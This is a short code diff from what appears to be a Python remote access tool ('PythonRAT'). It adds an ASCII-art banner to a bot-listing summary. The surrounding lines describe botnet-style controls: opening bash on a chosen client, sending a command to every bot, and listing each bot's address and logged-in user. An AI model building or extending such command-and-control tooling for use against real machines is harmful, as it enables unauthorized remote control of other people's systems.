@@ -22,6 +22,24 @@ CLI_OPTIONS += f'* {termcolor.colored("Indexes of clients separated by space to 
 CLI_OPTIONS += f'* {termcolor.colored("Index of one client to jump into bash (send","red")} "{termcolor.colored("exit","yellow",attrs=["bold"])}" {termcolor.colored("for termination)","red")}\n'
 CLI_OPTIONS += f'* {termcolor.colored("Send","red")} "{termcolor.colored("all", "yellow",attrs=["bold"])}" {termcolor.colored("to send a single command for each bot","red")}\n'
 
+FUN_BANNER = termcolor.colored('''
+
+        _        PythonRAT        _
+       |_|                       |_|
+       | |         /^^^\         | |
+      _| |_      (| "o" |)      _| |_
+    _| | | | _    (_---_)    _ | | | |_
+   | | | | |' |    _| |_    | `| | | | |
+   |          |   /     \   |          |
+    \        /  / /(. .)\ \  \        /
+      \    /  / /  | . |  \ \  \    /
+        \  \/ /    ||v||    \ \/  /
+         \__/      || ||      \__/
+                   () ()
+                   || ||
+                  ooO Ooo  ''','green',attrs=["bold"])
+
+
 def isNotListed(ip: str, ip_list: Bot) -> bool:
     for listed_ip in ip_list:
         if ip in str(listed_ip):
@@ -81,13 +99,14 @@ class Context:
             bot.idx = self.bots.index(bot) + 1
 
     def get_database_summary(self) -> str:
+        global FUN_BANNER
         list_bot = []
         bot_len = len(self.bots)
         x = PrettyTable()
         x.field_names = [termcolor.colored("Index","yellow",attrs=["bold"]), termcolor.colored("Remote address","yellow",attrs=["bold"]), termcolor.colored("Logged as","yellow",attrs=["bold"])]
         for bot in self.bots:
             x.add_row([termcolor.colored(bot.idx,"yellow",attrs=["bold"]), termcolor.colored(bot.remote_address,"yellow",attrs=["bold"]), termcolor.colored(bot.user,"yellow",attrs=["bold"])])
-        return f'\n{x}\n{termcolor.colored("Bots :","cyan",attrs=["bold"])} {termcolor.colored(bot_len,"yellow",attrs=["bold"])}'
+        return f'\n{FUN_BANNER}\n{x}\n{termcolor.colored("Bots :","cyan",attrs=["bold"])} {termcolor.colored(bot_len,"yellow",attrs=["bold"])}'
     
     def getLenBots(self):
         return len(self.bots)
